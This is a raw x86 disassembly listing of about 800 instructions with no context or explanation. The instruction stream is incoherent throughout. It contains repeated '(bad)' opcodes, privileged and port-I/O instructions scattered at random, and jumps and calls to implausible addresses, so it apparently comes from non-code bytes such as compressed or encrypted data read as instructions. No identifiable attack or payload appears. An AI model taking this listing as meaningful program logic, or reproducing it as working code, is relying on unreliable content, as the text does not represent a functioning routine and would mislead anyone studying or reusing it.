  431b9a:	ret    0x8b
  431b9d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431ba3:	xor    DWORD PTR [ecx],0xc
  431ba6:	pushf  
  431ba7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431bad:	rdmsr  
  431baf:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431bb6:	dec    ebp
  431bb7:	ret    
  431bb8:	mov    edi,DWORD PTR [esi-0x4]
  431bbb:	pop    eax
  431bbc:	dec    ebp
  431bbd:	jne    0x431b4a
  431bbf:	xor    edi,esp
  431bc1:	inc    eax
  431bc2:	dec    ebp
  431bc3:	jbe    0x431c18
  431bc5:	inc    eax
  431bc6:	pop    ebp
  431bc7:	add    edx,DWORD PTR [esi+0x8]
  431bca:	push   esp
  431bcb:	dec    eax
  431bcc:	push   ecx
  431bcd:	mov    eax,edi
  431bcf:	and    al,0xf0
  431bd1:	jo     0x431bbe
  431bd3:	mov    eax,DWORD PTR [ebx]
  431bd5:	sbb    BYTE PTR [ebp+0x4d],cl
  431bd8:	mov    eax,DWORD PTR [ebx]
  431bda:	nop
  431bdb:	or     BYTE PTR [eax],al
  431bdd:	jne    0x431c36
  431bdf:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431be5:	cld    
  431be6:	xor    edi,edi
  431be8:	add    edi,DWORD PTR [ebp+0x3]
  431beb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bf1:	js     0x431b77
  431bf3:	jae    0x431bf7
  431bf5:	(bad)  
  431bf7:	xor    al,0x5d
  431bf9:	jmp    0x431b86
  431bfb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431c02:	fdecstp 
  431c04:	test   BYTE PTR [edi],ah
  431c06:	add    bh,BYTE PTR [ebp+0x0]
  431c09:	add    ebx,DWORD PTR [ebp-0x77]
  431c0c:	mov    edi,eax
  431c0e:	cmp    al,0x0
  431c11:	adc    dh,BYTE PTR [ebx]
  431c13:	jge    0x431c18
  431c15:	mov    edi,DWORD PTR [ebx]
  431c17:	jl     0x431c28
  431c19:	clc    
  431c1a:	dec    edi
  431c1b:	jge    0x431c1d
  431c1d:	mov    eax,DWORD PTR [ebx]
  431c1f:	jb     0x431c29
  431c21:	mov    ecx,DWORD PTR [ebp-0x8]
  431c24:	mov    edi,edi
  431c26:	xor    edx,DWORD PTR [eax]
  431c28:	add    edi,DWORD PTR [ebx]
  431c2a:	mov    DWORD PTR [ebp-0x10],edi
  431c2d:	inc    edi
  431c2e:	pop    ebp
  431c2f:	jge    0x431c6c
  431c31:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c35:	mov    edx,0xc05d87f0
  431c3a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c3e:	fimul  WORD PTR [eax]
  431c40:	fist   WORD PTR [ebp+0x1c]
  431c43:	in     al,dx
  431c44:	jne    0x431c32
  431c46:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c4c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c50:	fdivp  st(0),st
  431c52:	fild   WORD PTR [ebp+0x4510f85c]
  431c58:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c5e:	inc    ebp
  431c5f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c65:	mov    ebp,DWORD PTR [ebx-0x4]
  431c68:	adc    al,0x8b
  431c6a:	rcl    DWORD PTR [eax],0x48
  431c6d:	mov    esi,0x7080803
  431c72:	fiadd  WORD PTR [ebp+0x4d]
  431c75:	(bad)  
  431c76:	mov    edx,DWORD PTR [edx-0x4]
  431c79:	mov    edx,DWORD PTR [ebp-0x4]
  431c7c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c82:	mov    DWORD PTR [edi+0x872dc],edi
  431c88:	xlat   BYTE PTR ds:[ebx]
  431c89:	into   
  431c8a:	ffreep st(6)
  431c8c:	retf   0x6c7
  431c8f:	iret   
  431c90:	dec    ebp
  431c91:	inc    ebp
  431c92:	mov    DWORD PTR [ebx],edi
  431c94:	fmul   QWORD PTR [edi]
  431c96:	dec    ebp
  431c97:	jnp    0x431ccc
  431c99:	add    BYTE PTR [ebx],al
  431c9b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c9e:	inc    ebp
  431c9f:	dec    ebp
  431ca0:	lea    esi,[ebx]
  431ca2:	add    DWORD PTR [ebx],eax
  431ca4:	jb     0x431ce1
  431ca6:	add    BYTE PTR [edi],cl
  431ca8:	inc    ebp
  431ca9:	imul   eax,edi,0x858bd800
  431caf:	cld    
  431cb0:	clc    
  431cb1:	mov    DWORD PTR [ebp+0x0],eax
  431cb4:	inc    DWORD PTR [eax]
  431cb6:	or     al,0xde
  431cb8:	sbb    bh,0x1
  431cbb:	retf   
  431cbc:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431cc3:	dec    ebp
  431cc4:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cca:	enter  0x12de,0xdf
  431cce:	inc    ebp
  431ccf:	pop    ebp
  431cd0:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cd6:	add    DWORD PTR [edx],edx
  431cd8:	add    BYTE PTR [ebp+0x50],dl
  431cdb:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ce1:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431ce7:	or     ah,al
  431ce9:	pop    ss
  431cea:	cdq    
  431ceb:	push   ebp
  431cec:	clc    
  431ced:	mov    eax,DWORD PTR [ebp-0x4]
  431cf0:	xor    edx,edx
  431cf2:	add    esi,DWORD PTR [ebx]
  431cf4:	cmp    eax,DWORD PTR [ebx]
  431cf6:	hlt    
  431cf7:	cmp    DWORD PTR [ebx],esp
  431cf9:	or     al,BYTE PTR [ebp+0xf]
  431cfc:	mov    eax,DWORD PTR [edx]
  431cfe:	loopne 0x431d00
  431d00:	(bad)  
  431d01:	mov    ecx,esi
  431d03:	cld    
  431d04:	pushf  
  431d05:	pop    ebp
  431d06:	fwait
  431d07:	mov    esi,DWORD PTR [edx]
  431d09:	lock mov eax,eax
  431d0c:	adc    BYTE PTR [ebx],al
  431d0e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d15:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d1b:	dec    ebp
  431d1c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d22:	(bad)  
  431d23:	iret   
  431d24:	inc    ebp
  431d25:	(bad)  
  431d26:	jne    0x431d75
  431d28:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d2e:	(bad)  
  431d2f:	cmp    ebx,eax
  431d31:	je     0x431cb9
  431d33:	add    edi,edi
  431d35:	or     bh,bh
  431d37:	dec    ebp
  431d38:	inc    ebp
  431d39:	mov    esi,DWORD PTR [ebx]
  431d3b:	cld    
  431d3c:	add    ecx,esi
  431d3e:	cmp    ecx,DWORD PTR [eax-0xc]
  431d41:	mov    edx,DWORD PTR [edi]
  431d43:	or     BYTE PTR [ebp-0x7c],al
  431d46:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d4c:	test   BYTE PTR [ebx+ebx*4],cl
  431d4f:	inc    ebp
  431d50:	xor    bh,BYTE PTR [esi]
  431d52:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d59:	jne    0x431d22
  431d5b:	mov    ebp,esp
  431d5d:	fcomp  DWORD PTR [ebx]
  431d5f:	add    BYTE PTR [ecx],al
  431d61:	inc    DWORD PTR [ebp-0x75]
  431d64:	(bad)  
  431d65:	cld    
  431d66:	add    al,0xce
  431d68:	mov    ecx,edi
  431d6a:	cld    
  431d6b:	inc    ebp
  431d6c:	fidivr WORD PTR [ebx]
  431d6e:	fbstp  TBYTE PTR [ebp-0x3e]
  431d71:	mov    eax,DWORD PTR [eax]
  431d73:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d79:	fadd   st,st(7)
  431d7b:	add    BYTE PTR [ebp-0x1],al
  431d7e:	mov    ecx,DWORD PTR [esp+edi*8]
  431d81:	inc    ebp
  431d82:	mov    bh,0xc7
  431d85:	loopne 0x431dcc
  431d87:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d8d:	sbb    dh,BYTE PTR [ebx]
  431d8f:	pushf  
  431d90:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d96:	mov    eax,edi
  431d98:	cwde   
  431d99:	inc    ebp
  431d9a:	inc    ebp
  431d9b:	jne    0x431d28
  431d9d:	mov    esp,esp
  431d9f:	clc    
  431da0:	add    al,0x4d
  431da2:	mov    DWORD PTR [ebx],esi
  431da4:	or     al,0x33
  431da6:	inc    ebp
  431da7:	lea    ecx,[ebx-0x398d13fd]
  431dad:	add    bh,al
  431daf:	inc    ebp
  431db0:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431db7:	add    ebp,esp
  431db9:	shufps xmm1,xmm3,0xc7
  431dbd:	(bad)  
  431dbe:	jmp    0x748858e7
  431dc3:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431dc9:	hlt    
  431dca:	mov    ecx,DWORD PTR [edi]
  431dcc:	fadd   DWORD PTR [ebp+0x0]
  431dcf:	xor    ecx,DWORD PTR [edi]
  431dd1:	add    ecx,ecx
  431dd3:	cmp    edi,edi
  431dd5:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dd9:	(bad)  
  431dda:	jmp    0x431d67
  431ddc:	mov    edi,esp
  431dde:	or     al,0xc6
  431de0:	inc    ebp
  431de1:	(bad)  
  431de2:	mov    eax,DWORD PTR [ebp+0x10]
  431de5:	jne    0x431d70
  431de7:	mov    eax,DWORD PTR [ecx]
  431de9:	clc    
  431dea:	add    BYTE PTR [ebp-0x40],cl
  431ded:	xor    edx,DWORD PTR [eax-0x73]
  431df0:	jne    0x431df3
  431df2:	push   DWORD PTR [edx+0x8]
  431df5:	add    BYTE PTR [ebp+0x45],al
  431df8:	mov    ebp,ecx
  431dfa:	cld    
  431dfb:	add    BYTE PTR [ebp+0x0],cl
  431dfe:	xor    eax,DWORD PTR [ebp+0x3]
  431e01:	mov    DWORD PTR [ebx],edi
  431e03:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431e09:	sub    eax,0x5d330e4d
  431e0e:	lea    esi,[ebx]
  431e10:	add    DWORD PTR [ebx],eax
  431e12:	jb     0x431dfd
  431e14:	add    BYTE PTR [eax],al
  431e16:	inc    ebp
  431e17:	add    bl,ch
  431e19:	inc    ebp
  431e1a:	mov    esi,DWORD PTR [ebx]
  431e1c:	or     al,0x3
  431e1e:	(bad)  
  431e1f:	mov    edi,eax
  431e21:	in     al,dx
  431e22:	scas   eax,DWORD PTR es:[edi]
  431e23:	inc    ebp
  431e24:	mov    esi,DWORD PTR [ebx]
  431e26:	in     al,0x3
  431e28:	add    al,0x89
  431e2a:	mov    ecx,DWORD PTR [eax+edi*8]
  431e2d:	dec    ebp
  431e2e:	(bad)  
  431e2f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e36:	mov    ecx,eax
  431e38:	cld    
  431e39:	push   es
  431e3a:	dec    ebp
  431e3b:	add    al,0x33
  431e3d:	mov    DWORD PTR [ebx],eax
  431e3f:	in     al,dx
  431e40:	cmp    DWORD PTR [ebp-0x67],eax
  431e43:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e49:	mov    edx,DWORD PTR [ebp-0x4]
  431e4c:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e4f:	xor    eax,DWORD PTR [ebp+0x3]
  431e52:	cmp    DWORD PTR [ebx],0x8b32749a
  431e58:	xor    edi,esp
  431e5a:	jmp    0xff771bac
  431e5f:	add    ecx,DWORD PTR [ebp-0x3f]
  431e62:	xor    ebx,DWORD PTR [edi]
  431e64:	add    eax,ecx
  431e66:	cmp    ebx,DWORD PTR [eax]
  431e68:	mov    ecx,DWORD PTR [ebp-0x4]
  431e6b:	mov    ecx,DWORD PTR [eax]
  431e6d:	adc    BYTE PTR [ebp-0x80],al
  431e70:	jmp    0x431e73
  431e72:	mov    eax,DWORD PTR [eax]
  431e74:	cld    
  431e75:	mov    bh,0xc6
  431e77:	push   ecx
  431e78:	(bad)  
  431e79:	jne    0x431ed9
  431e7b:	dec    ecx
  431e7d:	or     BYTE PTR [ecx+ebx*1],cl
  431e80:	push   ebp
  431e81:	inc    ebp
  431e82:	in     al,dx
  431e83:	add    ebp,esp
  431e85:	or     bh,al
  431e87:	dec    ebp
  431e88:	cld    
  431e89:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e8f:	xor    DWORD PTR [edx],0x2
  431e92:	pushf  
  431e93:	dec    DWORD PTR [ebx+0x45510cf4]
  431e99:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e9f:	mov    edx,DWORD PTR [ecx+0xc]
  431ea2:	xor    eax,esi
  431ea4:	mov    edx,0xc172c7
  431ea9:	inc    ebp
  431eaa:	mov    esi,DWORD PTR [ebp+0x8]
  431ead:	mov    eax,edx
  431eaf:	call   0x84c7e5a4
  431eb4:	add    DWORD PTR [ebx-0x76bace00],ebx
  431eba:	mov    ebp,eax
  431ebc:	or     BYTE PTR [eax],dl
  431ebe:	jo     0x431f0d
  431ec0:	push   edi
  431ec1:	xor    esi,DWORD PTR [ebp+0x3]
  431ec4:	(bad)  
  431ec5:	pmulhuw mm0,mm1
  431ec8:	test   DWORD PTR [ebp-0x8],ecx
  431ecb:	mov    DWORD PTR [ebp-0x67],eax
  431ece:	mov    eax,DWORD PTR [ebp-0x4]
  431ed1:	xor    edi,DWORD PTR [ebp-0x73]
  431ed4:	xor    eax,DWORD PTR [ebx]
  431ed6:	xor    esi,DWORD PTR [edx+0x3]
  431ed9:	add    BYTE PTR [ecx],bh
  431edb:	inc    ebp
  431edc:	(bad)  
  431edd:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ee3:	mov    DWORD PTR [eax],0x750f0004
  431ee9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431eef:	lock add BYTE PTR [ebp+0x0],cl
  431ef3:	mov    esi,DWORD PTR [ebp-0x18]
  431ef6:	mov    ebp,edx
  431ef8:	or     al,0x72
  431efa:	ja     0x431efc
  431efc:	mov    edx,esi
  431efe:	cld    
  431eff:	(bad)  
  431f02:	cli    
  431f03:	mov    esi,DWORD PTR [ebp-0x4]
  431f06:	cmp    ecx,esi
  431f08:	bswap  edi
  431f0a:	(bad)
  431f0e:	mov    esi,DWORD PTR [ebp-0x4]
  431f11:	mov    esi,ecx
  431f13:	clc    
  431f14:	repnz add esi,DWORD PTR [ebp+0x45]
  431f18:	push   ebx
  431f19:	xor    eax,DWORD PTR [ebp+0x3]
  431f1c:	cmp    al,0x5f
  431f1e:	pushf  
  431f1f:	pop    ebx
  431f20:	jmp    0x431fe7
  431f25:	mov    esi,DWORD PTR [ebp-0x7d]
  431f28:	xor    ebp,DWORD PTR [eax]
  431f2a:	lea    eax,[ebp-0x8]
  431f2d:	xor    edx,esi
  431f2f:	pushf  
  431f30:	out    dx,eax
  431f31:	(bad)  
  431f32:	neg    eax
  431f34:	ins    DWORD PTR es:[edi],dx
  431f35:	test   esi,edi
  431f37:	clc    
  431f38:	pop    esp
  431f39:	inc    ebp
  431f3a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f40:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f46:	add    cl,al
  431f48:	jne    0x431ee5
  431f4a:	mov    esi,DWORD PTR [edx]
  431f4c:	in     al,dx
  431f4d:	push   esi
  431f4e:	xor    BYTE PTR [ebp-0xe],dh
  431f51:	add    edi,esi
  431f53:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f59:	add    cl,bh
  431f5b:	mov    edi,DWORD PTR [ebp+0x8]
  431f5e:	mov    DWORD PTR [ebp-0x14],esi
  431f61:	add    esi,DWORD PTR [ebp+0x3c]
  431f64:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f6a:	mov    ah,0x3e
  431f6c:	fwait
  431f6d:	pushf  
  431f6e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f74:	jne    0x431f01
  431f76:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f79:	icebp  
  431f7a:	icebp  
  431f7b:	shl    edx,0xf2
  431f7e:	(bad)  
  431f7f:	mov    ah,0x16
  431f81:	push   eax
  431f82:	jne    0x431f17
  431f84:	mov    ecx,DWORD PTR [edi]
  431f86:	in     al,dx
  431f87:	jmp    0x431f7a
  431f89:	add    dl,dh
  431f8b:	mov    edi,esi
  431f8d:	or     al,0x8
  431f8f:	inc    ebp
  431f90:	jne    0x431f95
  431f92:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f98:	ret    
  431f99:	or     bh,bh
  431f9b:	jge    0x431f85
  431f9d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431fa3:	xor    edi,eax
  431fa5:	add    esi,DWORD PTR [ebp-0x77]
  431fa8:	mov    ebx,esp
  431faa:	clc    
  431fab:	neg    DWORD PTR [ebp-0x7c]
  431fae:	xor    eax,DWORD PTR [eax]
  431fb0:	cmp    eax,DWORD PTR [eax]
  431fb2:	repz jne 0x431f4a
  431fb5:	xor    eax,DWORD PTR [ecx]
  431fb7:	add    ebx,DWORD PTR [eax]
  431fb9:	mov    DWORD PTR [ebp-0x8],eax
  431fbc:	mov    eax,edi
  431fbe:	cld    
  431fbf:	lock pop eax
  431fc1:	test   DWORD PTR [ebx],esi
  431fc3:	clc    
  431fc4:	add    edx,DWORD PTR [edi-0x740bff77]
  431fca:	fdivp  st(4),st
  431fcc:	test   ecx,esi
  431fce:	(bad)  
  431fcf:	jnp    0x431fd0
  431fd1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fd7:	jae    0x431f64
  431fd9:	sub    edi,esp
  431fdb:	(bad)  
  431fdc:	shl    DWORD PTR [eax-0x3e],0x89
  431fe0:	leave  
  431fe1:	call   0x8198d6ee
  431fe6:	in     al,dx
  431fe7:	(bad)  
  431fe8:	in     al,dx
  431fe9:	add    bh,al
  431feb:	mov    esp,edi
  431fed:	in     al,dx
  431fee:	test   DWORD PTR [ebp-0x8],edi
  431ff1:	mov    eax,DWORD PTR [ebp+0x2b]
  431ff4:	xor    al,BYTE PTR [ebx]
  431ff6:	pushf  
  431ff7:	jnp    0x57321c30
  431ffd:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  432001:	loopne 0x432036
  432003:	jne    0x431fc0
  432005:	mov    esi,DWORD PTR [edx-0x20]
  432008:	add    BYTE PTR [ebp-0x3d],bh
  43200b:	xor    eax,DWORD PTR [ebp-0x73]
  43200e:	mov    edi,DWORD PTR [esi]
  432010:	cld    
  432011:	jb     0x431fd9
  432013:	add    bl,al
  432015:	jne    0x43205c
  432017:	mov    edx,DWORD PTR [edi-0x10]
  43201a:	jge    0x432099
  43201c:	mov    esi,DWORD PTR [ebx]
  43201e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432022:	xor    esi,DWORD PTR [ebp-0x77]
  432025:	mov    esi,eax
  432027:	lock inc ebp
  432029:	jge    0x43205c
  43202b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432032:	dec    ebp
  432033:	mov    esi,DWORD PTR [ebx]
  432035:	loopne 0x431fc0
  432037:	jge    0x432031
  432039:	add    DWORD PTR [ebp-0x7d],eax
  43203c:	icebp  
  43203d:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432044:	dec    ebp
  432045:	hlt    
  432046:	xor    ebx,DWORD PTR [ebp-0x77]
  432049:	mov    esi,esp
  43204b:	in     al,0x45
  43204d:	jge    0x43208c
  43204f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432056:	dec    ebp
  432057:	push   esp
  432058:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43205e:	inc    ebp
  43205f:	hlt    
  432060:	xor    DWORD PTR [ebp-0x61],esi
  432063:	mov    edi,DWORD PTR [eax+0xf19504]
  432069:	repnz mov DWORD PTR [ebp+0x20],ebx
  43206d:	cmp    eax,DWORD PTR [ebp+0xf]
  432070:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432074:	fistp  WORD PTR [ebx+0x0]
  432077:	inc    ebp
  432078:	mov    ebx,DWORD PTR [edi+0xc]
  43207b:	add    eax,eax
  43207d:	inc    ebp
  43207e:	test   BYTE PTR [ebx],dh
  432080:	add    eax,DWORD PTR [ebx]
  432082:	add    BYTE PTR [esi+0x45],bl
  432085:	ret    0x85
  432088:	jnp    0x5443a457
  43208e:	inc    bp
  432090:	inc    ebp
  432091:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432097:	fdiv   QWORD PTR [ebx]
  432099:	test   DWORD PTR [ecx+0x453bf8],edi
  43209f:	push   ebx
  4320a0:	add    edi,DWORD PTR [esi+0x708088b]
  4320a6:	cmp    esi,eax
  4320a8:	setnp  BYTE PTR [ecx-0x74fcffce]
  4320af:	mov    esp,edi
  4320b1:	call   0x33ce6603
  4320b6:	or     BYTE PTR [ebx],al
  4320b8:	inc    ecx
  4320b9:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320bf:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320c5:	lock add cl,al
  4320c8:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320cf:	mov    ch,0x45
  4320d1:	clc    
  4320d2:	xor    eax,DWORD PTR [ebp+0x3]
  4320d5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320db:	inc    ebp
  4320dc:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320e2:	mov    edi,eax
  4320e4:	mov    eax,DWORD PTR [ebp+0x3c]
  4320e7:	mov    ecx,DWORD PTR [eax]
  4320e9:	hlt    
  4320ea:	inc    ebp
  4320eb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320f2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320f8:	push   ebp
  4320f9:	mov    edi,DWORD PTR [ebx]
  4320fb:	in     al,dx
  4320fc:	jne    0x4320bf
  4320fe:	mov    eax,DWORD PTR [ebp-0x28]
  432101:	add    DWORD PTR [eax],0xe8058dec
  432107:	clc    
  432108:	mov    esi,DWORD PTR [edi-0x8]
  43210b:	add    dh,dl
  43210d:	rol    WORD PTR [ebp-0x1],cl
  432111:	mov    edx,DWORD PTR [eax+0x8]
  432114:	jne    0x4320d6
  432116:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43211d:	inc    ebp
  43211e:	push   esp
  43211f:	test   DWORD PTR [ecx+0xf],ecx
  432122:	sub    edx,esp
  432124:	add    eax,DWORD PTR [eax]
  432126:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  43212c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432133:	mov    eax,DWORD PTR [ecx]
  432135:	and    BYTE PTR [eax],al
  432137:	cmp    al,0x10
  432139:	add    BYTE PTR [ebp+0x66],al
  43213c:	inc    ecx
  43213e:	push   esp
  43213f:	add    dh,BYTE PTR [ebp+0x0]
  432142:	push   edx
  432143:	enterw 0xc1,0x4d
  432148:	mov    esp,DWORD PTR [esi+0x20]
  43214b:	add    DWORD PTR [ecx-0x7b],eax
  43214e:	add    eax,DWORD PTR [ebx]
  432150:	str    WORD PTR [eax+0x45]
  432154:	lea    ecx,[ebx+0x45890801]
  43215a:	sbb    BYTE PTR [ebx],al
  43215c:	dec    ebp
  43215d:	cmp    al,0xf
  43215f:	inc    ebp
  432160:	push   eax
  432161:	mov    esi,DWORD PTR [ebx]
  432163:	push   eax
  432164:	add    eax,eax
  432166:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43216d:	inc    ebp
  43216e:	add    BYTE PTR [ecx],dh
  432170:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432177:	(bad)  
  432178:	mov    ebx,eax
  43217a:	loopne 0x4321c1
  43217c:	dec    ebp
  43217d:	mov    ecx,DWORD PTR [edi]
  43217f:	cld    
  432180:	push   eax
  432181:	xchg   DWORD PTR [ebx],esi
  432183:	add    DWORD PTR [ebx],ebp
  432185:	add    BYTE PTR [ebx],ch
  432187:	or     BYTE PTR [ecx],bh
  432189:	dec    ecx
  43218a:	loopne 0x43218f
  43218c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432192:	push   ebp
  432193:	add    DWORD PTR [ebx+0x55100800],eax
  432199:	dec    ebp
  43219a:	jmp    0x432125
  43219c:	mov    esp,DWORD PTR [eax]
  43219e:	sbb    dl,dl
  4321a0:	inc    eax
  4321a1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  4321a7:	add    BYTE PTR [ebx+0x74528555],cl
  4321ad:	push   ebp
  4321ae:	div    DWORD PTR [ebx]
  4321b0:	and    eax,DWORD PTR [ebx]
  4321b2:	add    edx,DWORD PTR [edx-0x30]
  4321b5:	jno    0x432142
  4321b7:	inc    DWORD PTR [eax+eiz*1]
  4321ba:	inc    ebp
  4321bb:	push   eax
  4321bc:	push   eax
  4321bd:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321c3:	mov    edi,esp
  4321c5:	push   eax
  4321c6:	inc    ebp
  4321c7:	enter  0x458b,0x8
  4321cb:	push   ecx
  4321cc:	(bad)  
  4321cd:	call   0x10d2ba5
  4321d2:	pop    ss
  4321d3:	push   ebp
  4321d4:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321da:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321e0:	push   ecx
  4321e1:	jo     0x4321cb
  4321e3:	inc    DWORD PTR [edi]
  4321e5:	or     BYTE PTR [eax],al
  4321e7:	call   0xce2931
  4321ec:	fmul   QWORD PTR [ebp+0x55]
  4321ef:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321f5:	mov    bh,0x8c
  4321f7:	adc    al,0x9b
  4321f9:	dec    esp
  4321fa:	xor    bl,BYTE PTR [eax]
  4321fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4321ff:	mov    eax,DWORD PTR [ebp-0x4]
  432202:	mov    esi,DWORD PTR [edi-0x3148f924]
  432208:	push   es
  432209:	retf   
  43220a:	mov    BYTE PTR [ebp-0x30],0x3b
  43220e:	inc    ebp
  43220f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432216:	retf   0x83fc
  432219:	into   
  43221a:	dec    ebp
  43221b:	retf   
  43221c:	mov    ecx,DWORD PTR [ebp-0x74]
  43221f:	mov    eax,DWORD PTR [eax]
  432221:	fdiv   QWORD PTR [ebx]
  432223:	mov    bh,0x3
  432225:	push   es
  432226:	mov    esi,ecx
  432228:	sbb    cl,dl
  43222a:	dec    ebp
  43222b:	sar    DWORD PTR [ebx],cl
  43222d:	push   ebp
  43222e:	jne    0x43223f
  432230:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432236:	lea    ebx,[eax]
  432238:	call   0xf4ccadff
  43223d:	sbb    dh,dl
  43223f:	add    edx,ebx
  432241:	push   ebp
  432242:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432248:	push   ecx
  432249:	mov    DWORD PTR [eax-0x30],edx
  43224c:	test   DWORD PTR [edx],eax
  43224e:	xadd   esp,esi
  432251:	pop    es
  432252:	add    cl,dl
  432254:	mov    eax,ecx
  432256:	or     al,0x45
  432258:	(bad)  
  432259:	push   eax
  43225a:	add    DWORD PTR [edx+0x0],eax
  43225d:	add    ecx,DWORD PTR [ecx]
  43225f:	and    dh,cl
  432261:	call   0xc72b31
  432266:	add    DWORD PTR [ebp+0x0],edx
  432269:	mov    esp,DWORD PTR [ebp+0x18]
  43226c:	add    BYTE PTR [eax+0x50],cl
  43226f:	xor    eax,DWORD PTR [eax]
  432271:	add    esp,DWORD PTR [esi+0x3b]
  432274:	inc    ebp
  432275:	je     0x4321fa
  432277:	push   ecx
  432278:	dec    BYTE PTR [ebp-0x77]
  43227b:	add    eax,esi
  43227d:	or     al,0x5e
  43227f:	inc    eax
  432280:	add    BYTE PTR [ebx],al
  432282:	data16 and BYTE PTR [ebp+0x50],al
  432286:	sub    DWORD PTR [ecx],0xfffffff8
  432289:	add    BYTE PTR [ebp-0x75],ah
  43228c:	add    BYTE PTR [eax],bl
  43228e:	enter  0x894d,0x8b
  432292:	int3   
  432293:	loopne 0x432257
  432295:	rol    BYTE PTR [eax],0x33
  432298:	lea    cx,[ebp+0xa]
  43229c:	data16 jb 0x4322e4
  43229f:	add    BYTE PTR [ebx+0x44890855],cl
  4322a5:	sbb    ah,al
  4322a7:	inc    ebp
  4322a8:	cmp    al,0xf
  4322aa:	add    BYTE PTR [edx+0x66],dl
  4322ad:	xor    ecx,DWORD PTR [eax]
  4322af:	sub    eax,DWORD PTR [edx]
  4322b1:	mov    eax,DWORD PTR [eax]
  4322b3:	or     al,0x66
  4322b5:	ror    edx,cl
  4322b7:	dec    ebp
  4322b8:	inc    ebp
  4322b9:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322bf:	cld    
  4322c0:	or     BYTE PTR [edi+0x4501dd],dl
  4322c6:	ret    0xecce
  4322c9:	retf   
  4322ca:	(bad)  
  4322cb:	dec    ebp
  4322cc:	mov    al,0x8b
  4322ce:	loopne 0x4322f0
  4322d0:	cmp    ecx,DWORD PTR [edx]
  4322d2:	inc    ebp
  4322d3:	daa    
  4322d4:	loopne 0x43225d
  4322d6:	in     al,dx
  4322d7:	add    edi,eax
  4322d9:	add    BYTE PTR [eax+0x3f52e155],bh
  4322df:	push   ebp
  4322e0:	inc    ebp
  4322e1:	xor    ebx,edx
  4322e3:	add    ebp,esp
  4322e5:	push   edx
  4322e6:	push   bp
  4322e8:	inc    ebp
  4322e9:	(bad)  
  4322ea:	in     eax,dx
  4322eb:	push   esp
  4322ec:	(bad)  
